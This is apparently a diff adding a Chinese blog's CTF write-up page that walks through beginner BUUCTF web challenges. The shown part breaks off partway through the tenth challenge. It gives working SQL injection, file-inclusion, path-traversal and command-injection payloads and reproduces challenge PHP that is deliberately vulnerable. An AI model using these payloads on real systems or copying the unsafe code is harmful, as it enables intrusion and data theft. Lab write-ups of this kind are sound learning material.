@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://sina.wuuconix.link/large/007YVyKcly1h1w9ogawmvj30jg0jgtdg.jpg">
+  <link rel="icon" href="https://sina.wuuconix.link/large/007YVyKcly1h1w9ogawmvj30jg0jgtdg.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="wuuconix">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="背景 在家摸鱼太久啥都没干。突然想起自己好像是CTF半退役选手，便来做做题目当作益智游戏了。  Web Page 1  1. EasySQL 万能密码 账号输入 1&#39; or 1&#x3D;1#，密码随便输即可，或者反过来，账号随便输，密码输入1&#39; or 1&#x3D;1#。  2. WarmUp 源代码发现 source.php。然后审计，发现传入一个file参数可以用来include file。同时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF刷题记录">
+<meta property="og:url" content="https://wuuconix.link/2022/01/21/buuctf/index.html">
+<meta property="og:site_name" content="wuuconix&#39;s blog">
+<meta property="og:description" content="背景 在家摸鱼太久啥都没干。突然想起自己好像是CTF半退役选手，便来做做题目当作益智游戏了。  Web Page 1  1. EasySQL 万能密码 账号输入 1&#39; or 1&#x3D;1#，密码随便输即可，或者反过来，账号随便输，密码输入1&#39; or 1&#x3D;1#。  2. WarmUp 源代码发现 source.php。然后审计，发现传入一个file参数可以用来include file。同时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sina.wuuconix.link/large/007YVyKcly1h3o0uraxjfj30wy0cutff.jpg">
+<meta property="article:published_time" content="2022-01-21T13:59:49.000Z">
+<meta property="article:modified_time" content="2022-01-21T13:59:49.000Z">
+<meta property="article:author" content="wuuconix">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sina.wuuconix.link/large/007YVyKcly1h3o0uraxjfj30wy0cutff.jpg">
+  
+  
+  
+  <title>BUUCTF刷题记录 - wuuconix&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/toubudaziji.css">
+<link rel="stylesheet" href="/css/gundongtiao.css">
+<link rel="stylesheet" href="/css/APlayer.min.css">
+<link rel="stylesheet" href="/css/scrollbar.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_3317131_6niuojsefqt.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"wuuconix.link","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"Tpnm8c3kMWvXEXe6TN9JQnvb-gzGzoHsz","app_key":"1I9i7nfFTc4ulrrtGwfite4s","server_url":"https://tpnm8c3k.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="wuuconix's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>wuuconix</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://sina.wuuconix.link/large/007YVyKcly1h3o0v1gp0cj31hc0u07h5.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="BUUCTF刷题记录"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-01-21 13:59" pubdate>
+          2022年1月21日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">BUUCTF刷题记录</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <header><meta name="referrer" content="never"></header>
+
+    <div id="aplayer-qRipNqTS" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="1913652676" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
+    ></div>
+<h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2>
+<p>在家摸鱼太久啥都没干。突然想起自己好像是CTF半退役选手，便来做做题目当作益智游戏了。</p>
+<h2 id="web-page-1"><a class="markdownIt-Anchor" href="#web-page-1"></a> Web Page 1</h2>
+<h3 id="1-easysql"><a class="markdownIt-Anchor" href="#1-easysql"></a> 1. EasySQL</h3>
+<p>万能密码</p>
+<p>账号输入 <code>1' or 1=1#</code>，密码随便输即可，或者反过来，账号随便输，密码输入<code>1' or 1=1#</code>。</p>
+<h3 id="2-warmup"><a class="markdownIt-Anchor" href="#2-warmup"></a> 2. WarmUp</h3>
+<p>源代码发现 source.php。然后审计，发现传入一个file参数可以用来include file。同时通过hint.php得到flag在 ffffllllaaaagggg 文件中。然后利用目录遍历的技巧得到flag。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/?file=source.php%3F/</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>ffffllllaaaagggg<br></code></pre></td></tr></table></figure>
+<h3 id="3-havefun"><a class="markdownIt-Anchor" href="#3-havefun"></a> 3. Havefun</h3>
+<p>最简单的源码查看和get请求考察。</p>
+<p>利用get方式传递cat=dog即可获得flag。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com/?cat=dog<br></code></pre></td></tr></table></figure>
+<h3 id="4-include"><a class="markdownIt-Anchor" href="#4-include"></a> 4. Include</h3>
+<p>简单的php伪协议利用，可以看到藏在注释中的flag。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">view-source:http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/?file=php:/</span><span class="hljs-regexp">/filter/</span>convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+<p>然后base64解密即可。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220121134145053.png" srcset="/img/loading.gif" lazyload alt="base64 -d" /></p>
+<h3 id="5-随便注"><a class="markdownIt-Anchor" href="#5-随便注"></a> 5. 随便注</h3>
+<p>该题目存在堆叠注入。即可以执行多条sql语句。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; show tables;#</span><br></code></pre></td></tr></table></figure>
+<p>我们可以得到有两个表，分别是<code>1919810931114514</code>，<code>words</code>。猜测flag就在<code>1919810931114514</code>这个表中。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; show columns from `1919810931114514`;#</span><br></code></pre></td></tr></table></figure>
+<p>发现flag列。</p>
+<p>如果这道题的考点只有堆叠注入的话，我们就可以利用以下payload直接读出flag。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; select flag from `1919810931114514`;#</span><br></code></pre></td></tr></table></figure>
+<p>但是这道题还过滤了一些常用命令，题目提示如下。</p>
+<blockquote>
+<p>return preg_match(&quot;/select|update|delete|drop|insert|where|./i&quot;,$inject);</p>
+</blockquote>
+<p>所以相当于我们离flag真的只有一墙之隔，正常来说，我们做sql注入题目很多时间都花在了确定flag所在的表，然后是所在的列，现在我们都知道了，但是无法查询。</p>
+<p>查看过某位大佬的wp之后，我发现了一种我之前从未使用过的方式<code>PREPARE STATEMENT</code>，即预处理。</p>
+<p>payload如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;Set @b=concat(&quot;sele&quot;,&quot;ct &quot;,&quot;* from `1919810931114514`&quot;);prepare dump from @b;execute dump;#</span><br></code></pre></td></tr></table></figure>
+<p>解释一下，prepare会去预处理一个sql语句，这里被叫做dump。然后语句的具体内容由@b给定。而@b利用了concat来连接select的两部分，绕过了题目的检查，最后excute执行预处理语句，成功得到flag。</p>
+<blockquote>
+<p>参考资料如下。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45940434/article/details/106661111">SQL注入(堆叠注入)——强网杯2019随便注_cc菜的一批-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.begtut.com/mysql/mysql-prepared-statement.html">MySQL PREPARE语句 | 新手教程 (begtut.com)</a></p>
+</blockquote>
+<h3 id="6easysql"><a class="markdownIt-Anchor" href="#6easysql"></a> 6.EasySQL</h3>
+<p>不得不说Web实在是太难了。</p>
+<p>这道题我发现了堆叠注入，找到了Flag表。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220209153353059.png" srcset="/img/loading.gif" lazyload alt="Flag表" /></p>
+<p>可惜Flag关键字被过滤了，我们无法直接 <code>1; select * from Flag</code>。</p>
+<p>于是我试着用上一道题了解到的预处理来绕过Flag。结果发现from也被过滤了，而预处理中需要from关键字作为结构。心态崩溃。</p>
+<p>在网上搜索后我发现了这道题的源码。 <a target="_blank" rel="noopener" href="https://github.com/team-su/SUCTF-2019/tree/master/Web/easy_sql">SUCTF-2019/Web/easy_sql</a></p>
+<p>源码的主要部分。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select &quot;</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;query&#x27;</span>] . <span class="hljs-string">&quot;||flag from Flag&quot;</span>;<br><span class="hljs-title function_ invoke__">mysqli_multi_query</span>(<span class="hljs-variable">$MysqlLink</span>,<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
+<p><code>mysqli_multi_query</code>函数使得这道题存在堆叠注入。然后我们通过输入框传入的参数会以<code>$post['query']</code>的形式插入到sql语句中。</p>
+<p>由于sql语句中有<code>||</code>存在，<code>||</code>即逻辑或，实际上的结果只有0和1两种，我们无法获得flag。</p>
+<p>我们可以通过传入<code>*, 1</code>从而构造出<code>select *, 1|flag from Flag</code>这个语句获得flag。</p>
+<p>还可以通过设置<code>sql_mode</code>将管道符作为连接(concat)而非或运算符，从而得到flag。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">*</span>, <span class="hljs-number">1</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>对应<span class="hljs-keyword">sql</span>语句 <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span>, <span class="hljs-number">1</span><span class="hljs-operator">||</span>flag <span class="hljs-keyword">from</span> Flag<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询结果 <span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> flag&#123;da7caaaa<span class="hljs-number">-8e1</span>c<span class="hljs-number">-4</span>b42<span class="hljs-operator">-</span>abb8<span class="hljs-number">-879328</span>bb7189&#125; [<span class="hljs-number">1</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">1</span> )<br><br><span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>PIPES_AS_CONCAT;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>对应<span class="hljs-keyword">sql</span>语句 <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>; <span class="hljs-number">1</span>;<span class="hljs-keyword">set</span> sql_mode<span class="hljs-operator">=</span>PIPES_AS_CONCAT;<span class="hljs-keyword">select</span> <span class="hljs-number">1</span><span class="hljs-operator">||</span><span class="hljs-number">1</span>flag <span class="hljs-keyword">from</span> Flag <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询结果 <span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">1</span> ) <span class="hljs-keyword">Array</span> ( [<span class="hljs-number">0</span>] <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">1</span>flag&#123;da7caaaa<span class="hljs-number">-8e1</span>c<span class="hljs-number">-4</span>b42<span class="hljs-operator">-</span>abb8<span class="hljs-number">-879328</span>bb7189&#125; )<br></code></pre></td></tr></table></figure>
+<p>经过这道题的教训，我打算以后的题目直接去看源码了（</p>
+<h3 id="7exec"><a class="markdownIt-Anchor" href="#7exec"></a> 7.Exec</h3>
+<p>简单的命令联合执行，熟悉linux的管道符就能做出来。</p>
+<p>在github上找到了ACTF新生赛里本题的源码 <a target="_blank" rel="noopener" href="https://github.com/CSUAuroraLab/ACTF_Junior_2020/blob/master/Web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/src/www/index.php">ACTF_Junior_2020/index.php </a></p>
+<p>主要代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;target&#x27;</span>])) &#123;<br>	<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ping -c 3 &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;target&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>php中调用了system函数来执行linux命令，我们在ping执行完后可以利用管道符来执行其他的命令。</p>
+<p>payload</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span><span class="hljs-comment">; cat flag</span><br></code></pre></td></tr></table></figure>
+<h3 id="8secret-file"><a class="markdownIt-Anchor" href="#8secret-file"></a> 8.Secret File</h3>
+<p>阅读源码发现<code>Archive_room.php</code>。然后发现<code>action.php</code>，其设置了location http头，会进行快速页面跳转影响我们阅读。利用curl命令查看其内容。</p>
+<p><img src="https://upyun.wuuconix.link/image-20220209182332122.png" srcset="/img/loading.gif" lazyload alt="curl" /></p>
+<p>发现<code>secre3t.php</code>文件。内容如下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>得知flag的文件位置<code>flag.php</code>，测试后推测flag在flag.php的php代码中，没有输出。</p>
+<p>利用php伪协议读取base64后的文件并包含。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>x.node4.buuoj.cn:<span class="hljs-number">81</span><span class="hljs-regexp">/secr3t.php?file=php:/</span><span class="hljs-regexp">/filter/</span>read=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure>
+<p>解码后得到flag。</p>
+<h3 id="9lovesql"><a class="markdownIt-Anchor" href="#9lovesql"></a> 9.LoveSQL</h3>
+<p>考察简单的union联合查询注入。</p>
+<p>密码框里输入 <code>1' union select 1, 2, 3#</code>后发现2和3的位置出现了页面回显。那么这两个点都可以进行注入。</p>
+<p>首先获得数据库名为geek</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>, <span class="hljs-built_in">database</span>(), <span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<p>然后查看geek库下面的数据表们 geekuser 和 l0ve1ysq1</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, group_concat(table_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema = <span class="hljs-string">&#x27;geek&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<p>查看后者花里胡哨的，先查它里面的字段 id,username,password</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, group_concat(column_name), <span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">&#x27;l0ve1ysq1&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<p>猜测flag在password字段里</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>, group<span class="hljs-constructor">_concat(<span class="hljs-params">username</span>)</span>, group<span class="hljs-constructor">_concat(<span class="hljs-params">password</span>)</span> from l0ve1ysq1 #<br></code></pre></td></tr></table></figure>
+<p>发现最后一个记录就是flag。</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello cl4y,glzjin,Z4cHAr7zCr,0xC4m3l,Ayrain,Akko,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,fouc5,leixiao,flag！<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Your password is &#x27;wo_tai_nan_le,glzjin_wants_a_girlfriend,biao_ge_dddd_hm,linux_chuang_shi_ren,a_rua_rain,yan_shi_fu_de_mao_bo_he,cl4y,di_2_kuai_fu_ji,di_3_kuai_fu_ji,di_4_kuai_fu_ji,di_5_kuai_fu_ji,di_6_kuai_fu_ji,di_7_kuai_fu_ji,di_8_kuai_fu_ji,Syc_san_da_hacker,flag</span><span class="hljs-template-variable">&#123;a3fc2519-e16f-4028-b3f6-f8f6294b99b5&#125;</span><span class="language-xml">&#x27;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p>这道题变着花向我们介绍了一些师傅，密码设置的也非常有趣。</p>
+<h3 id="10ping-ping-ping"><a class="markdownIt-Anchor" href="#10ping-ping-ping"></a> 10.Ping Ping Ping</h3>
+<p>考察命令执行的绕过。</p>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>))&#123; <span class="hljs-comment">//过滤一堆符号</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, <span class="hljs-variable">$ip</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ /&quot;</span>, <span class="hljs-variable">$ip</span>))&#123; <span class="hljs-comment">//过滤空格</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/bash/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123; <span class="hljs-comment">//过滤bash</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class="hljs-variable">$ip</span>))&#123; <span class="hljs-comment">//过滤从左往右的f l a g</span><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span 